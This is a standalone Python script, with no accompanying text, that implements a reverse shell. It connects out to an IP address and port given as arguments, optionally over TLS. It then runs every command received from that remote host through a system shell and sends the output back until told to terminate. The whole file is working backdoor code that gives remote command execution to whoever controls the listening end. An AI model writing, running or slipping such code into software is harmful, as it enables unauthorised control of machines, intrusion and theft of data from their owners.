from socket import socket, AF_INET, SOCK_STREAM
from subprocess import Popen, PIPE, STDOUT
import argparse as ap

def connect(ip, port, enc):
    try:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((ip, port))
        if enc:
            import ssl
            s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
        return s
    except Exception as e:
        raise e

def interact(s):
    while True:
        command =  s.recv(1024).decode()
        if command == 'terminate':
            s.close()
            break
        CMD =  Popen(command, shell=True, stdout=PIPE, stderr=STDOUT)
        result = CMD.stdout.read()
        s.send(result)

if __name__ == '__main__':
    parser = ap.ArgumentParser()
    parser.add_argument('-i', '--ip', help='The IP address to bind to.', required=True)
    parser.add_argument('-p', '--port', help='The port to connect to.', required=True, type=int)
    parser.add_argument('-s', '--ssl', help='Use this flag if you want to encrypt your connection.', action='store_true')
    args = parser.parse_args()

    interact(connect(args.ip, args.port, args.ssl))
